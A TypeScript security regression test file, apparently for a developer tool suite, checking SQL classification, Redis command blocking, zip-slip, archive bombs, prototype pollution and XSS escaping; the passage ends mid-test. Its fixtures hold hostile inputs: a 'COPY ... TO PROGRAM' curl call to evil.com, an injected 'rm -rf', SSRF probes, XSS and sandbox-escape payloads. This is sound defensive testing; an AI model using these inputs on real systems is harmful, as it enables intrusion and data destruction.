/**
 * Regression and benchmark-sanity tests for Slice 3 fixes:
 * - Database Workbench (`src/db/**`)
 * - Core Studio Tool Backends (`src/*_tools.ts`, `src/*_helpers.ts`)
 * - Non-FM Feature Modules (`src/features/{doggo,gdu,ipinfo,rad,rip,sd,subfinder,theme-studio,watchexec}/**`)
 * - CLI Applications (`cli_apps/*.ts`)
 */
import { describe, expect, it } from "bun:test";
import { createHash } from "node:crypto";
import {
  chmodSync,
  existsSync,
  mkdirSync,
  mkdtempSync,
  readFileSync,
  rmSync,
  statSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { deflateRawSync, gzipSync } from "node:zlib";

import { MysqlAdapter } from "../src/db/adapters/mysql.ts";
import { PostgresAdapter } from "../src/db/adapters/postgres.ts";
import { SqliteAdapter } from "../src/db/adapters/sqlite.ts";
import {
  classifyStatement,
  isReadOnlyPragma,
  maskLiterals,
} from "../src/db/classify.ts";
import { parseUniversalTable } from "../src/db/importParser.ts";
import { MemorySecretStore, ProfileStore } from "../src/db/profiles.ts";
import { WorkbenchService } from "../src/db/service.ts";
import { splitStatements } from "../src/db/splitter.ts";
import { compileUserRule } from "../src/db/staging/validate.ts";
import { generateWorkbenchHtml } from "../src/db/workbench_ui.ts";

import { applyAuth, buildUrl, parseHeaderLines } from "../src/api_tools.ts";
import { buildMatcher } from "../src/devtools_tools.ts";
import { windowsCmdQuote } from "../src/launcher_tools.ts";
import { checkPorts, reversePtr } from "../src/network_tools.ts";
import {
  isDangerousCommand,
  parseRedisImportPayload,
} from "../src/redis_helpers.ts";
import { replaceSafe, runRegexSafe } from "../src/regex_tools.ts";

import {
  performDnsLookup,
  performDohLookup,
} from "../src/features/doggo/doggoDoers.ts";
import {
  classifyIp,
  fetchIpDetailsAsync,
} from "../src/features/ipinfo/ipinfoDoers.ts";
import { rad } from "../src/features/rad/index.ts";
import { readManifest, writeManifest } from "../src/features/rip/ripDoers.ts";
import { runRipCoordinator } from "../src/features/rip/ripCoordinator.ts";
import {
  buildReplacerRegex,
  writeContent,
} from "../src/features/sd/sdDoers.ts";
import { processFile } from "../src/features/sd/sdCoordinator.ts";
import { generateThemeStudioPageHtml } from "../src/features/theme-studio/studioPage.ts";
import {
  killRunningProcess,
  matchesFilter,
} from "../src/features/watchexec/watchexecDoers.ts";

import { evaluateSafeMath } from "../cli_apps/calculator_cli.ts";
import {
  getProjectRoot,
  isValidSuiteProjectRoot,
} from "../cli_apps/codecaine_suite_cli.ts";
import {
  calculateByteShannonEntropy,
  hashFileBytes,
} from "../cli_apps/crypto_cli.ts";
import {
  stripJpegFileAtomically,
  stripJpegMetadataBuffer,
} from "../cli_apps/exif_cli.ts";
import { evaluateExpression } from "../cli_apps/kalker_cli.ts";
import { assertSafeArchiveEntryPath } from "../cli_apps/ouch_cli.ts";
import {
  decryptVaultPayload,
  encryptVaultPayload,
  resolveVaultPassphrase,
} from "../cli_apps/vault_backup_manager.ts";

function withTmpDir<T>(
  prefix: string,
  fn: (dir: string) => Promise<T> | T,
): Promise<T> {
  const dir = mkdtempSync(join(tmpdir(), prefix));
  chmodSync(dir, 0o700);
  return Promise.resolve()
    .then(() => fn(dir))
    .finally(() => {
      rmSync(dir, { recursive: true, force: true });
    });
}

describe("Slice 3: Database Workbench Security, QA & Performance", () => {
  it("[V-OPT-01] splits a 10,000-line SQL script in O(N) time (<200ms) with exact line numbers", () => {
    const lines: string[] = [];
    for (let i = 1; i <= 5000; i++) {
      lines.push(`-- comment line ${i}`);
      lines.push(`SELECT ${i} AS id, 'val;${i}' AS label;`);
    }
    const bigSql = lines.join("\n");
    const t0 = performance.now();
    const stmts = splitStatements(bigSql, { engine: "postgres" });
    const elapsedMs = performance.now() - t0;

    expect(stmts.length).toBe(5000);
    expect(stmts[0]?.line).toBe(2);
    expect(stmts[4999]?.line).toBe(10000);
    expect(elapsedMs).toBeLessThan(200);
  });

  it("[V-SEC-07] classifies modifying CTEs, EXPLAIN ANALYZE writes, COPY PROGRAM, OUTFILE, and dialect escapes", () => {
    expect(
      classifyStatement(
        "postgres",
        "WITH del AS (DELETE FROM users RETURNING id) SELECT * FROM del",
      ).kind,
    ).toBe("write");
    expect(
      classifyStatement(
        "postgres",
        "WITH ins AS (INSERT INTO logs VALUES (1) RETURNING *) SELECT * FROM ins",
      ).kind,
    ).toBe("write");
    expect(
      classifyStatement("postgres", "EXPLAIN ANALYZE DELETE FROM users").kind,
    ).toBe("destructive");
    expect(
      classifyStatement("postgres", "EXPLAIN SELECT * FROM users").kind,
    ).toBe("read");
    expect(
      classifyStatement("postgres", "COPY users TO PROGRAM 'curl evil.com'")
        .kind,
    ).toBe("destructive");
    expect(
      classifyStatement(
        "mysql",
        "SELECT * INTO/**/OUTFILE '/tmp/dump.csv' FROM users",
      ).kind,
    ).toBe("admin");
    expect(
      classifyStatement("mysql", "SELECT * INTO DUMPFILE '/tmp/bin' FROM users")
        .kind,
    ).toBe("admin");

    // Dialect-accurate literal masking: SQLite/Postgres do NOT treat \' as quote escape
    const maskedSqlite = maskLiterals(
      "SELECT 'abc\\'; DROP TABLE x; --",
      "sqlite",
    );
    expect(maskedSqlite).toContain("DROP TABLE x");
    const maskedPgEscape = maskLiterals(
      "SELECT E'abc\\'; DROP TABLE x;' AS s",
      "postgres",
    );
    expect(maskedPgEscape).not.toContain("DROP TABLE x");

    // Nested block comments masked completely
    const maskedNested = maskLiterals(
      "SELECT /* outer /* inner */ DELETE FROM t */ 1",
      "postgres",
    );
    expect(maskedNested).not.toContain("DELETE");

    // PRAGMA allowlist vs function-call / assignment bypasses
    expect(isReadOnlyPragma("PRAGMA table_info(users)")).toBe(true);
    expect(isReadOnlyPragma("PRAGMA query_only")).toBe(true);
    expect(isReadOnlyPragma("PRAGMA query_only(0)")).toBe(false);
    expect(isReadOnlyPragma("PRAGMA query_only = OFF")).toBe(false);
    expect(isReadOnlyPragma("PRAGMA writable_schema = 1")).toBe(false);
  });

  it("[V-SEC-07] enforces readOnly SQLite handle regardless of sqliteMode and blocks write SQL in exportCsv", async () => {
    await withTmpDir("db-sec07-", async (dir) => {
      const dbFile = join(dir, "sample.sqlite");
      const seedAdapter = new SqliteAdapter({
        engine: "sqlite",
        path: dbFile,
        sqliteMode: "create",
      });
      await seedAdapter.connect();
      await seedAdapter.query(
        "CREATE TABLE items (id INTEGER PRIMARY KEY, name TEXT)",
      );
      await seedAdapter.query(
        "INSERT INTO items (name) VALUES ('alpha'), ('beta')",
      );
      await seedAdapter.close();

      // Even with sqliteMode: "readwrite", readOnly: true must open SQLite in hardware readonly mode
      const roAdapter = new SqliteAdapter({
        engine: "sqlite",
        path: dbFile,
        sqliteMode: "readwrite",
        readOnly: true,
      });
      await roAdapter.connect();
      await expect(
        roAdapter.query("INSERT INTO items (name) VALUES ('gamma')"),
      ).rejects.toThrow();
      await expect(roAdapter.query("PRAGMA query_only(0)")).rejects.toThrow();
      const readRes = await roAdapter.query("PRAGMA table_info(items)");
      expect(readRes.rows.length).toBe(2);
      await roAdapter.close();

      // WorkbenchService.exportCsv sql mode must reject multi-statement and write/DDL queries
      const svc = new WorkbenchService(
        new ProfileStore(dir, new MemorySecretStore()),
      );
      const collectCsv = async (
        connId: string,
        source: Parameters<WorkbenchService["exportCsv"]>[1],
      ) => {
        let out = "";
        for await (const chunk of svc.exportCsv(connId, source)) out += chunk;
        return out;
      };
      try {
        const conn = await svc.connect({
          profile: {
            name: "RW SQLite",
            engine: "sqlite",
            path: dbFile,
            sqliteMode: "readwrite",
          },
        });

        await expect(
          collectCsv(conn.connectionId, { sql: "DELETE FROM items" }),
        ).rejects.toThrow(/read-only/i);

        await expect(
          collectCsv(conn.connectionId, {
            sql: "SELECT * FROM items; DELETE FROM items",
          }),
        ).rejects.toThrow(/single read-only SQL statement/i);

        const csv = await collectCsv(conn.connectionId, {
          sql: "SELECT id, name FROM items ORDER BY id",
        });
        expect(csv.trim().split(/\r?\n/)).toEqual([
          "id,name",
          "1,alpha",
          "2,beta",
        ]);
      } finally {
        await svc.closeAll();
      }
    });
  });

  it("[V-SEC-15][V-SEC-19][V-OPT-10][V-QA-17] redacts BunSql ctor errors, caps CSV imports, guards ReDoS, and syncs UI", async () => {
    // Synchronous throw inside new SQL(...) must be caught and redacted via normalizeError
    class ThrowingPostgresAdapter extends PostgresAdapter {
      protected override driverOptions(): Record<string, never> {
        throw new Error(
          "driver init failed for postgres://admin:SuperSecretPass123@127.0.0.1:5432/db",
        );
      }
    }
    const badPg = new ThrowingPostgresAdapter({
      engine: "postgres",
      host: "127.0.0.1",
      port: 5432,
      user: "admin",
      password: "SuperSecretPass123",
      database: "db",
    });
    let caughtMsg = "";
    try {
      await badPg.connect();
    } catch (err: any) {
      caughtMsg = String(err?.message ?? "");
    }
    expect(caughtMsg.length).toBeGreaterThan(0);
    expect(caughtMsg).not.toContain("SuperSecretPass123");

    // Import byte size cap
    await expect(
      parseUniversalTable({ content: "a,b\n1,2\n", maxBytes: 4 }),
    ).rejects.toThrow(/exceeds maximum allowed size/i);

    // ReDoS guard in staging validation
    const compiledRule = compileUserRule({
      column: "col",
      kind: "regex",
      value: "(a+)+$",
    });
    expect("error" in compiledRule).toBe(true);

    // Workbench UI state reset on profile change & engine-aware identifier quoting
    const html = generateWorkbenchHtml({
      token: "wb-tok",
      title: "Test Workbench",
    });
    expect(html).toContain("function resetConnectionView()");
    expect(html).toContain("function quoteSqlId(");
  });

  it("[V-QA-09][V-OPT-12] resets per-statement timeout on BunSqlAdapter error when began=false and sweeps expired pending tokens", async () => {
    const executedSql: string[] = [];
    let released = false;
    const mysqlAdapter = new MysqlAdapter({
      engine: "mysql",
      host: "127.0.0.1",
      port: 3306,
      user: "root",
      database: "app",
      readOnly: false,
    });
    (mysqlAdapter as any).pool = {
      reserve: async () => ({
        unsafe: async (s: string) => {
          executedSql.push(s);
          if (s === "SELECT * FROM broken_view") {
            throw new Error("Table broken_view does not exist");
          }
          return [];
        },
        release: () => {
          released = true;
        },
      }),
    };

    await expect(
      mysqlAdapter.query("SELECT * FROM broken_view", [], { timeoutMs: 750 }),
    ).rejects.toThrow(/broken_view/i);
    expect(executedSql).toEqual([
      "SET SESSION max_execution_time = 750",
      "SELECT * FROM broken_view",
      "SET SESSION max_execution_time = 0",
    ]);
    expect(released).toBe(true);

    // Expired confirmation tokens are swept when minting / checking pending gates
    await withTmpDir("db-opt12-", async (dir) => {
      const svc = new WorkbenchService(
        new ProfileStore(dir, new MemorySecretStore()),
      );
      try {
        const conn = await svc.connect({
          profile: {
            name: "Mem",
            engine: "sqlite",
            path: ":memory:",
            sqliteMode: "memory",
          },
        });
        const g1 = await svc.query(
          conn.connectionId,
          "DROP TABLE IF EXISTS t1",
        );
        expect("needsConfirmation" in g1 && g1.needsConfirmation).toBe(true);
        const pendingMap: Map<string, { expires: number }> = (svc as any)
          .pending;
        expect(pendingMap.size).toBe(1);
        for (const entry of pendingMap.values()) {
          entry.expires = Date.now() - 10_000;
        }
        await svc.query(conn.connectionId, "DROP TABLE IF EXISTS t2");
        expect(pendingMap.size).toBe(1);
      } finally {
        await svc.closeAll();
      }
    });
  });
});

describe("Slice 3: Core Studio Tool Backends", () => {
  it("[V-SEC-06][V-SEC-17][V-SEC-19][V-OPT-10] hardens windowsCmdQuote, Redis dangerous commands, and DevTools regex", async () => {
    const quoted = windowsCmdQuote(
      "C:\\Program Files\\My App & %PATH%\\run.exe",
    );
    expect(quoted).toContain('"^%"');
    expect(quoted).not.toContain("%PATH%");
    expect(quoted.startsWith('"')).toBe(true);
    expect(windowsCmdQuote("bad\r\nline")).toBe("badline");

    expect(isDangerousCommand('"EVAL" "return 1" 0')).toBe(true);
    expect(isDangerousCommand("evalsha abc 0")).toBe(true);
    expect(isDangerousCommand("FUNCTION LOAD payload")).toBe(true);
    expect(isDangerousCommand("REPLICAOF 127.0.0.1 6379")).toBe(true);
    expect(isDangerousCommand("CONFIG GET maxmemory")).toBe(false);
    expect(isDangerousCommand("CONFIG SET dir /etc")).toBe(true);

    const oversizeRedis = await parseRedisImportPayload(null, {
      bytes: { byteLength: 60 * 1024 * 1024 } as Uint8Array,
    });
    expect(oversizeRedis.ok).toBe(false);
    expect(oversizeRedis.errors[0]).toMatch(/exceeds maximum allowed size/i);

    expect(() => buildMatcher("(a+)+$")).toThrow(/nested quantifiers/i);
  });

  it("[V-OPT-13][V-QA-17][V-OPT-09] pools regex worker preserving $1/$<name> groups and validates HTTP/network helpers", async () => {
    const r1 = await replaceSafe(
      "(?<word>[a-z]+)-(\\d+)",
      "g",
      "item-42 and code-99",
      "$<word>#$2",
    );
    expect(r1.error).toBeUndefined();
    expect(r1.count).toBe(2);
    expect(r1.text).toBe("item#42 and code#99");

    // Second invocation reuses pooled worker seamlessly
    const r2 = await runRegexSafe("\\b\\w+\\b", "g", "one two three");
    expect(r2.matches.length).toBe(3);

    // api_tools: partial percent-encoding + CRLF/case-insensitive header sanitization
    expect(
      buildUrl(
        "https://api.example.com/search",
        "q=hello%20world today\n#comment\na=1&b=2",
      ),
    ).toBe("https://api.example.com/search?q=hello%20world%20today&a=1&b=2");
    const parsedHeaders = parseHeaderLines(
      "X-Test: ok\r\nBad Header: 1\nx-test: override",
    );
    expect(parsedHeaders).toEqual({ "x-test": "override" });
    expect(
      applyAuth({ authorization: "Old" }, "Bearer Token", "tok\r\ninject"),
    ).toEqual({
      Authorization: "Bearer tokinject",
    });

    // In-process TCP probe against closed local port without spawning Python
    const closedScan = await checkPorts("127.0.0.1", [1], 200);
    expect(closedScan[0]?.status).not.toBe("OPEN");
    const ptrRes = await reversePtr("127.0.0.1");
    expect(Array.isArray(ptrRes.hostnames)).toBe(true);
  });
});

describe("Slice 3: Non-FM Features (RAD, Rip, SD, Doggo, IPInfo, Theme Studio, Watchexec)", () => {
  it("[V-SEC-09][V-SEC-11][V-QA-16] enforces serveStatic realpath containment, guardLocalRequest on HTTP/WS, and router escaping", async () => {
    await withTmpDir("rad-srv-", async (dir) => {
      const publicDir = join(dir, "public");
      const secretDir = join(dir, "secret");
      mkdirSync(publicDir);
      mkdirSync(secretDir);
      writeFileSync(join(publicDir, "hello.txt"), "public-ok");
      writeFileSync(join(secretDir, "passwd.txt"), "top-secret");
      symlinkSync(join(secretDir, "passwd.txt"), join(publicDir, "leak.txt"));

      const staticSrv = rad.serverutils.serveStatic({ dir: publicDir });
      try {
        const okRes = await fetch(`${staticSrv.url}/hello.txt`);
        expect(okRes.status).toBe(200);
        expect(await okRes.text()).toBe("public-ok");

        const symRes = await fetch(`${staticSrv.url}/leak.txt`);
        expect(symRes.status).toBe(403);

        const rebindRes = await fetch(`${staticSrv.url}/hello.txt`, {
          headers: { Host: "attacker.example.com" },
        });
        expect(rebindRes.status).toBe(403);
      } finally {
        staticSrv.stop();
      }

      const router = rad.serverutils.createRouter();
      router.get(
        "/v1.0/files(1)/:id",
        (_req, params) => new Response(JSON.stringify(params)),
      );
      const httpSrv = rad.serverutils.serveHttp({ router });
      try {
        expect(httpSrv.hostname).toBe("127.0.0.1");
        // Unescaped '.' or '()' must NOT match arbitrary characters
        const miss = await fetch(`${httpSrv.url}/v1X0/files1/abc`);
        expect(miss.status).toBe(404);

        const hit = await fetch(`${httpSrv.url}/v1.0/files(1)/hello%20world`);
        expect(hit.status).toBe(200);
        expect(await hit.json()).toEqual({ id: "hello world" });

        const crossOrigin = await fetch(`${httpSrv.url}/v1.0/files(1)/1`, {
          headers: { Origin: "https://evil.example" },
        });
        expect(crossOrigin.status).toBe(403);
      } finally {
        httpSrv.stop();
      }

      const wsHub = rad.serverutils.createWsHub();
      try {
        const nullOriginRes = await fetch(`http://127.0.0.1:${wsHub.port}`, {
          headers: { Origin: "null" },
        });
        expect(nullOriginRes.status).toBe(403);

        const badHostRes = await fetch(`http://127.0.0.1:${wsHub.port}`, {
          headers: { Host: "evil.example" },
        });
        expect(badHostRes.status).toBe(403);
      } finally {
        wsHub.stop();
      }
    });
  });

  it("[V-SEC-09] blocks negative tar octal headers and enforces maxOutputLength on compressed archives", async () => {
    // Craft a tar block with negative octal size "-0000000001" and valid header checksum
    const block = Buffer.alloc(512);
    block.write("neg.txt", 0, "utf-8");
    block.write("0000644\0", 100, "ascii");
    block.write("0000000\0", 108, "ascii");
    block.write("0000000\0", 116, "ascii");
    block.write("-0000000001\0", 124, "ascii");
    block.write("00000000000\0", 136, "ascii");
    block.write("0", 156, "ascii");
    block.write("ustar\0", 257, "ascii");
    block.write("00", 263, "ascii");
    let sum = 0;
    for (let i = 0; i < 512; i++) sum += i >= 148 && i < 156 ? 32 : block[i]!;
    block.write(sum.toString(8).padStart(6, "0") + "\0 ", 148, "ascii");

    expect(() => rad.tarutils.unpackTarBytes(block)).toThrow(/Invalid octal/i);

    // Gzip bomb guard in tarutils & compressutils
    const bigPayload = Buffer.alloc(32 * 1024, 0x41);
    const gz = gzipSync(bigPayload);
    expect(() => rad.tarutils.unpackTarGz(gz, 1024)).toThrow();
    expect(() => rad.compressutils.gzipDecompress(gz, 1024)).toThrow();
    expect(() =>
      rad.compressutils.deflateDecompress(deflateRawSync(bigPayload), 1024),
    ).toThrow();
    expect(() =>
      rad.compressutils.brotliDecompress(
        rad.compressutils.brotliCompress(bigPayload, 1),
        1024,
      ),
    ).toThrow();
    expect(() =>
      rad.compressutils.zstdDecompress(
        rad.compressutils.zstdCompress(bigPayload, 1),
        1024,
      ),
    ).toThrow();

    // Lying-header ZIP bomb guard in archiveutils
    const zip = Buffer.from(
      rad.archiveutils.zipFiles([
        { name: "bomb.txt", data: bigPayload, compress: true },
      ]),
    );
    await expect(rad.archiveutils.unzipToMemory(zip, 4096)).rejects.toThrow(
      /exceeds limit/i,
    );
  });

  it("[V-SEC-18][V-QA-16] guards prototype pollution in toml/template/html, JWT exp:0, timeouts, IPv6/UUID, and parseQuery", async () => {
    const doc: Record<string, any> = {};
    expect(() =>
      rad.tomlutils.setTomlPath(doc, "__proto__.polluted", "yes"),
    ).toThrow(/Unsafe key/i);
    expect(({} as any).polluted).toBeUndefined();

    const merged = rad.tomlutils.mergeToml(
      {},
      JSON.parse('{"__proto__":{"polluted":"yes"},"safe":1}'),
    );
    expect(({} as any).polluted).toBeUndefined();
    expect(merged.safe).toBe(1);

    expect(
      rad.templateutils.renderTemplate(
        "{{ __proto__.toString }}|{{ x | constructor }}",
        {
          x: "hi",
        },
      ),
    ).toBe("|hi");

    const expZeroJwt = rad.jwtutils.signJwt({ sub: "u1", exp: 0 }, "secret");
    expect(() => rad.jwtutils.verifyJwt(expZeroJwt, "secret")).toThrow(
      /expired/i,
    );

    const badExpJwt = [
      Buffer.from(JSON.stringify({ alg: "HS256", typ: "JWT" })).toString(
        "base64url",
      ),
      Buffer.from(JSON.stringify({ sub: "u1", exp: "never" })).toString(
        "base64url",
      ),
    ];
    // Sign manually to test non-numeric exp rejection
    const { createHmac } = await import("node:crypto");
    const sig = createHmac("sha256", "secret")
      .update(`${badExpJwt[0]}.${badExpJwt[1]}`)
      .digest("base64url");
    expect(() =>
      rad.jwtutils.verifyJwt(
        `${badExpJwt[0]}.${badExpJwt[1]}.${sig}`,
        "secret",
      ),
    ).toThrow(/Invalid JWT exp/i);

    expect(() =>
      rad.htmlutils.buildTag("div", { 'x" onload="alert(1)': "1" }),
    ).toThrow(/Invalid attribute name/i);

    // shellutils.execCmd timeout enforcement
    const t0 = performance.now();
    const timedOut = await rad.shellutils.execCmd("sleep 5", {
      timeoutMs: 150,
    });
    expect(timedOut.success).toBe(false);
    expect(timedOut.exitCode).toBe(124);
    expect(performance.now() - t0).toBeLessThan(2000);

    // sysutils.execSafe concurrent stdout + large stderr (>128 KB) without pipe deadlock
    const bigErr = await rad.sysutils.execSafe(process.execPath, [
      "-e",
      "process.stderr.write('E'.repeat(150000)); process.stdout.write('OK');",
    ]);
    expect(bigErr.exitCode).toBe(0);
    expect(bigErr.stdout).toBe("OK");
    expect(bigErr.stderr.length).toBe(150000);

    // validutils.isIpv6 & isUuid (including UUIDv7 + nil)
    expect(rad.validutils.isIpv6("2001:db8::1")).toBe(true);
    expect(rad.validutils.isIpv6("fe80::1ff:fe23:4567:890a")).toBe(true);
    expect(rad.validutils.isIpv6("999.999.999.999")).toBe(false);
    expect(rad.validutils.isUuid("018f4b7e-8c3b-7000-8000-000000000001")).toBe(
      true,
    );
    expect(rad.validutils.isUuid("00000000-0000-0000-0000-000000000000")).toBe(
      true,
    );

    // httputils.parseQuery preserves '=' in values and tolerates malformed '%'
    expect(
      rad.httputils.parseQuery("?sig=abc==&expr=x=1+2&bad=%E0%A4%A"),
    ).toEqual({
      sig: "abc==",
      expr: "x=1 2",
      bad: "%E0%A4%A",
    });
  });

  it("[V-QA-10][V-SEC-09][V-SEC-12][V-SEC-17][V-SEC-19] covers SD binary/literal safety, Rip manifest interop, Doggo/IPInfo, Theme Studio, and Watchexec", async () => {
    await withTmpDir("feat-fixes-", async (dir) => {
      // SD: literal '$1' & '$&' in stringMode + skip NUL binary files + preserve permissions via atomic rename
      const txtFile = join(dir, "sample.txt");
      writeFileSync(txtFile, "price is FOO_TOKEN", { mode: 0o640 });
      const sdRegex = buildReplacerRegex("FOO_TOKEN", true);
      const sdRes = await processFile(txtFile, sdRegex, "$100 & $&", true);
      expect(sdRes.hasChanged).toBe(true);
      await writeContent(txtFile, sdRes.newContent);
      expect(readFileSync(txtFile, "utf-8")).toBe("price is $100 & $&");
      expect(statSync(txtFile).mode & 0o777).toBe(0o640);

      const binFile = join(dir, "binary.bin");
      const binBytes = Buffer.from([0x00, 0x46, 0x4f, 0x4f, 0x00, 0xff]);
      writeFileSync(binFile, binBytes);
      const binRes = await processFile(
        binFile,
        buildReplacerRegex("FOO", true),
        "BAR",
        true,
      );
      expect(binRes.hasChanged).toBe(false);
      expect(readFileSync(binFile).equals(binBytes)).toBe(true);

      // Rip: reads rip_engine.ts `items` format and refuses corrupt manifest clobbering
      const grave = join(dir, "graveyard");
      mkdirSync(grave, { recursive: true });
      const engineManifest = {
        version: "1.0.0",
        graveyardRoot: grave,
        lastUpdated: new Date().toISOString(),
        items: [
          {
            id: "1_item",
            originalPath: join(dir, "old.txt"),
            buriedPath: join(grave, "files", "1_item"),
            name: "old.txt",
            type: "file",
            sizeBytes: 12,
            buriedAt: new Date().toISOString(),
          },
        ],
      };
      writeFileSync(
        join(grave, "manifest.json"),
        JSON.stringify(engineManifest),
      );
      const loaded = await readManifest(grave);
      expect(loaded.records.length).toBe(1);
      expect(loaded.records[0]?.originalPath).toBe(join(dir, "old.txt"));

      await writeManifest(grave, loaded);
      const savedRaw = JSON.parse(
        readFileSync(join(grave, "manifest.json"), "utf-8"),
      );
      expect(Array.isArray(savedRaw.items)).toBe(true);
      expect(Array.isArray(savedRaw.records)).toBe(true);

      // Corrupt manifest must throw rather than silently resetting to []
      writeFileSync(join(grave, "manifest.json"), "{corrupt-json");
      await expect(readManifest(grave)).rejects.toThrow(
        /manifest is corrupted/i,
      );

      // Permanent delete refuses graveyard root itself
      await expect(
        runRipCoordinator({
          targets: [grave],
          graveyardDir: grave,
          decompose: false,
          seance: false,
          unbury: false,
          permanent: true,
          dryRun: false,
          force: true,
          showSize: false,
          verbose: false,
        }),
      ).rejects.toThrow(/graveyard/i);
    });

    // Doggo DoH & record type validation
    await expect(
      performDohLookup("example.com", "A", "http://169.254.169.254/dns-query"),
    ).rejects.toThrow(/https:/i);
    await expect(
      performDohLookup("example.com", "A", "file:///etc/passwd"),
    ).rejects.toThrow();
    await expect(
      performDnsLookup("example.com", "A;rm -rf" as any),
    ).rejects.toThrow(/Unsupported DNS record type/i);

    // IPInfo IPv4-mapped IPv6 classification (`::ffff:127.0.0.1` and hex `::ffff:7f00:1`)
    expect(classifyIp("::ffff:127.0.0.1").isPrivateOrBogon).toBe(true);
    expect(classifyIp("::ffff:7f00:1").isPrivateOrBogon).toBe(true);
    expect(classifyIp("::ffff:10.0.0.5").rfc).toContain("RFC 1918");
    const privDetails = await fetchIpDetailsAsync("::ffff:127.0.0.1");
    expect(privDetails.country).toBe("Private / LAN");
    expect(privDetails.readme).toContain("Private / Bogon IP address");

    // Theme Studio XSS escaping & modal importer wiring
    const studioHtml = generateThemeStudioPageHtml({
      title: "<script>alert(1)</script>",
      initialOverrides: { "--bg-app": "</script><script>alert(1)</script>" },
    });
    expect(studioHtml).not.toContain("<script>alert(1)</script>");
    expect(studioHtml).not.toContain("</script><script>alert(1)");
    expect(studioHtml).toContain("importThemeFromJsonInline(jsonTxt.value)");
    expect(studioHtml).toContain("escHtml(");

    // Watchexec safe glob/regex filter & graceful SIGTERM kill
    expect(matchesFilter("src/app.test.ts", ["*.test.ts"])).toBe(true);
    expect(matchesFilter("src/app.ts", ["[unclosed-bracket"])).toBe(false);
    const sleeper = Bun.spawn(["sleep", "10"]);
    killRunningProcess(sleeper, 100);
    const exitCode = await sleeper.exited;
    expect(typeof exitCode).toBe("number");
  });
});

describe("Slice 3: CLI Utilities Security & QA Fixes", () => {
  it("[V-SEC-08] evaluates math expressions without new Function and blocks arbitrary JS injection", () => {
    expect(evaluateSafeMath("sin(pi / 2) + sqrt(144)")).toBeCloseTo(13, 8);
    expect(evaluateSafeMath("2pi")).toBeCloseTo(Math.PI * 2, 8);
    expect(evaluateSafeMath("2 ^ 3 ^ 2")).toBe(512); // right-associative exponentiation
    expect(evaluateSafeMath("5! + log(1000) + ln(e^2)")).toBeCloseTo(125, 8);
    expect(evaluateExpression("x^2 + 3*x", { x: -4 }).result).toBe(4);

    for (const payload of [
      "process.exit(1)",
      "globalThis.Bun",
      "constructor.constructor('return 1')()",
      "(() => 1)()",
      "Math.sin(1)",
      "1; 2",
    ]) {
      expect(() => evaluateSafeMath(payload)).toThrow();
      expect(evaluateExpression(payload).error).toBeDefined();
    }
  });

  it("[V-SEC-06][V-SEC-09][V-SEC-18][V-SEC-19] covers bundler --name, ouch zip-slip, rip -d, codecaine root, binary hash, JPEG EXIF strip, and vault AES-256-GCM", async () => {
    await withTmpDir("cli-fixes-", async (dir) => {
      // 1. ouch zip-slip validator
      expect(() => assertSafeArchiveEntryPath("../escape.sh", dir)).toThrow(
        /Zip-slip/i,
      );
      expect(() => assertSafeArchiveEntryPath("/etc/passwd", dir)).toThrow(
        /Zip-slip/i,
      );
      expect(() =>
        assertSafeArchiveEntryPath("C:\\Windows\\win.ini", dir),
      ).toThrow();
      expect(assertSafeArchiveEntryPath("nested/ok.txt", dir)).toBe(
        join(resolve(dir), "nested", "ok.txt"),
      );

      // 2. bundler_cli rejects traversal --name "../pwn" with non-zero exit
      const bundlerProc = Bun.spawnSync(
        [
          process.execPath,
          "run",
          resolve("cli_apps/bundler_cli.ts"),
          "--name",
          "../pwn",
        ],
        { stdout: "pipe", stderr: "pipe" },
      );
      expect(bundlerProc.exitCode).toBe(1);

      // 3. rip_cli -d with no targets in non-interactive mode requires --force
      const grave = join(dir, "rip-grave");
      const ripProc = Bun.spawnSync(
        [
          process.execPath,
          "run",
          resolve("cli_apps/rip_cli.ts"),
          "--graveyard",
          grave,
          "-d",
        ],
        { stdin: "ignore", stdout: "pipe", stderr: "pipe" },
      );
      expect(ripProc.exitCode).toBe(1);

      // 4. codecaine_suite_cli getProjectRoot ignores untrusted CWD package.json
      const fakeCwd = join(dir, "untrusted-cwd");
      mkdirSync(join(fakeCwd, "cli_apps"), { recursive: true });
      writeFileSync(
        join(fakeCwd, "package.json"),
        JSON.stringify({ name: "attacker-package" }),
      );
      expect(isValidSuiteProjectRoot(fakeCwd)).toBe(false);
      expect(getProjectRoot(fakeCwd, "")).toBe(resolve("."));

      // 5. crypto_cli raw binary file SHA-256 (non-UTF-8 bytes preserved!)
      const rawBin = Buffer.from([
        0x00, 0x80, 0xfe, 0xff, 0xc3, 0x28, 0xa0, 0xa1,
      ]);
      const binPath = join(dir, "raw.bin");
      writeFileSync(binPath, rawBin);
      const expectedSha = createHash("sha256").update(rawBin).digest("hex");
      expect(hashFileBytes(readFileSync(binPath), "sha256")).toBe(expectedSha);
      expect(calculateByteShannonEntropy(rawBin).bitsPerByte).toBeCloseTo(3, 3);

      // 6. exif_cli real JPEG APP1 EXIF stripping + honest non-JPEG rejection
      const app0Payload = Buffer.from(
        "JFIF\0\x01\x01\0\0\x01\0\x01\0\0",
        "binary",
      );
      const app0Seg = Buffer.alloc(4 + app0Payload.length);
      app0Seg[0] = 0xff;
      app0Seg[1] = 0xe0;
      app0Seg.writeUInt16BE(2 + app0Payload.length, 2);
      app0Payload.copy(app0Seg, 4);

      const exifPayload = Buffer.from("Exif\0\0SecretGPSCoordinates", "binary");
      const app1Seg = Buffer.alloc(4 + exifPayload.length);
      app1Seg[0] = 0xff;
      app1Seg[1] = 0xe1;
      app1Seg.writeUInt16BE(2 + exifPayload.length, 2);
      exifPayload.copy(app1Seg, 4);

      const sosToEoi = Buffer.from([
        0xff, 0xda, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00, 0x3f, 0x00, 0xaa, 0xff,
        0xd9,
      ]);
      const syntheticJpeg = Buffer.concat([
        Buffer.from([0xff, 0xd8]),
        app0Seg,
        app1Seg,
        sosToEoi,
      ]);
      const jpgPath = join(dir, "photo.jpg");
      writeFileSync(jpgPath, syntheticJpeg);

      const strippedRes = stripJpegFileAtomically(jpgPath);
      expect(strippedRes.removedSegments).toBe(1);
      const afterJpeg = readFileSync(jpgPath);
      expect(afterJpeg.includes(Buffer.from("SecretGPSCoordinates"))).toBe(
        false,
      );
      expect(afterJpeg[0]).toBe(0xff);
      expect(afterJpeg[1]).toBe(0xd8);
      expect(stripJpegMetadataBuffer(afterJpeg).removedSegments).toBe(0);

